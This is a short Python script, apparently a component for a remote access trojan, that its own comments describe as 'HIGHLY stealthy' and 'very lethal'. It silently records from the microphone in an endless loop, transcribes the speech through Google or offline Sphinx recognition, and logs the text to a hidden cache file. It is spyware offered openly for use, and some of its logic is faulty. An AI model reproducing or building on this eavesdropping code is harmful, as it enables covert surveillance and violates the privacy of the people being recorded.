# This is a HIGHLY stealthy program.
# I do not know if this has been implemented on any other rats, but it is very lethal.
# Enjoy it.



import speech_recognition as sr
import os
import urllib3
import time

from configuration import *

def connected_internet():
    try:
        urllib3.PoolManager().urlopen("1.1.1.1")
        return True
    except:
        return False

def main():
    while True:
        try:
            mic = sr.Microphone()
            r = sr.Recognizer()

            fp = open("/home/void/.cache/.on/log", "a")
            _json = ""

            with mic as source:
                while True:
                    r.adjust_for_ambient_noise(source)
                    audio = r.listen(source)
                    stuff = ""

                    if (connected_internet() and SPEECH_USE_GOOGLE_WHEN_ONLINE):
                        stuff = r.recognize_google(audio)
                    else:
                        stuff = r.recognize_sphinx(audio)

                    stuff = r.recognize_google(audio)
                    fp.write(stuff)
                    print(stuff)
                
        except Exception as error:
            print(str(error))
            time.sleep(5)
            continue

if __name__ == "__main__":
    main()

